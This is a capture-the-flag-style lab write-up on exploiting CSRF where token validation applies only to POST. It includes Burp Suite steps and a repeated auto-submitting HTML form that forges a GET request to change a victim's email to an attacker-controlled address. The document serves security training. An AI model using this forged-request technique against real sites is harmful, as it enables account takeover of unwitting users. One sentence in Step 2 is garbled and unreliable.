# Exploiting CSRF with Request Method-Based Token Validation Bypass

This guide delivers a clear, creative, and organized walkthrough to exploit a **Cross-Site Request Forgery (CSRF)** vulnerability where token validation depends on the request method. Imagine slipping through a security gate by switching from a heavily guarded POST to an unguarded GET, tricking the server into accepting your forged request! The objective is to bypass CSRF token validation by converting a `POST` request to a `GET` request, craft a malicious form to change a victim's email address, and solve the lab.

## Objective
Exploit the lack of CSRF token validation for `GET` requests to forge a request that changes a victim's email address using an auto-submitting form hosted on the exploit server.

## Prerequisites
- Burp Suite (Professional or Community Edition) with Proxy and Repeater modules configured.
- Access to the lab application with an account and an "Update email" feature.
- An exploit server provided by the lab (e.g., `YOUR-EXPLOIT-SERVER-ID.exploit-server.net`).
- Basic understanding of CSRF attacks, HTTP request methods, and HTML form manipulation.

## Background on the Vulnerability
The application's "Update email" feature requires a CSRF token for `POST` requests but fails to validate it for `GET` requests. This allows attackers to bypass token checks by crafting a `GET`-based CSRF exploit, tricking an authenticated user's browser into submitting an unauthorized email change when visiting a malicious page.

## Steps to Solve the Lab

### Step 1: Capture the Update Email Request
1. Open Burp’s browser and log in to your lab account.
2. Navigate to the account page and submit the "Update email" form with a test email.
3. In Burp Suite, go to **Proxy > HTTP history** and locate the `POST /my-account/change-email` request.
4. **Observation**: The request includes a `csrf` parameter (e.g., `csrf=abc123`) and an `email` parameter (e.g., `email=your-email@web-security-academy.net`).

### Step 2: Test CSRF Token Validation
1. Right-click the `POST /my-account/change-email` request and select **Send to Repeater**.
2. In Repeater, modify the `csrf` parameter to an invalid value (e.g., `csrf=invalid`).
3. Send the request.
4. **Observation**: The request CSRF token validation for `POST` requests.
   ```
    POST /my-account/change-email HTTP/2
   ```
   ![payload suc](./img/%20CSRF%20where%20token%20validation%20depends%20on%20request%20method/%20CSRF%20where%20token%20validation%20depends%20on%20request%20method(1).png)
   ![payload suc](./img/%20CSRF%20where%20token%20validation%20depends%20on%20request%20method/%20CSRF%20where%20token%20validation%20depends%20on%20request%20method(2).png)

### Step 3: Generate the CSRF Exploit
#### Option 1: Burp Suite Professional
1. Right-click the `POST /my-account/change-email` request in Proxy history.
2. Select **Engagement tools > Generate CSRF PoC**.
3. Enable the **Include auto-submit script** option.
4. Click **Regenerate** to create the exploit HTML, modifying it to use `GET`:
   ```html
   <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
       <input type="hidden" name="email" value="anything@web-security-academy.net">
       <input type="hidden" name="csrf" value="dummy">
   </form>
   <script>
       document.forms[0].submit();
   </script>
   ```
5. Copy the generated HTML.

#### Option 2: Burp Suite Community Edition
1. Right-click the `POST /my-account/change-email` request and select **Copy URL** to get the action URL (e.g., `https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email`).
2. Use the following HTML template, adapted for `GET`:
   ```html
   <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
       <input type="hidden" name="email" value="anything@web-security-academy.net">
       <input type="hidden" name="csrf" value="dummy">
   </form>
   <script>
       document.forms[0].submit();
   </script>
   ```
3. **Observation**: The form auto-submits a `GET` request, bypassing the CSRF token check.

### Step 4: Host the Exploit
1. Go to the exploit server provided by the lab.
2. Paste the CSRF exploit HTML into the **Body** section.
3. Click **Store** to save the exploit.
4. **Observation**: The exploit is hosted at `https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net`.

### Step 5: Test the Exploit on Yourself
1. Click **View exploit** on the exploit server to load the malicious page in Burp’s browser.
2. Monitor **Proxy > HTTP history** to confirm the `GET /my-account/change-email` request is sent.
3. Check the response to verify the email was updated.
4. **Observation**: The exploit successfully changes your email, confirming it works.

### Step 6: Modify the Exploit for the Victim
1. Edit the exploit HTML on the exploit server, changing the `email` value to a different address (e.g., `victim@attacker.com`):
   ```html
   <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
       <input type="hidden" name="email" value="victim@attacker.com">
       <input type="hidden" name="csrf" value="dummy">
   </form>
   <script>
       document.forms[0].submit();
   </script>
   ```
2. Click **Store** to save the updated exploit.

### Step 7: Deliver the Exploit
1. On the exploit server, click **Deliver to victim**.
2. **Observation**: The lab simulates the victim visiting the malicious page, executing the `GET` request, and changing their email, solving the lab.

![payload suc](./img/%20CSRF%20where%20token%20validation%20depends%20on%20request%20method/%20CSRF%20where%20token%20validation%20depends%20on%20request%20method(3).png)
![payload suc](./img/%20CSRF%20where%20token%20validation%20depends%20on%20request%20method/%20CSRF%20where%20token%20validation%20depends%20on%20request%20method(4).png)

### Step 8: Verify Success
1. If the lab does not confirm completion, verify:
   - The `action` URL matches the lab’s `/my-account/change-email` endpoint.
   - The `email` value is different from your own.
   - The exploit server’s log shows the malicious page was accessed.
2. **Observation**: Successful email change for the victim completes the lab.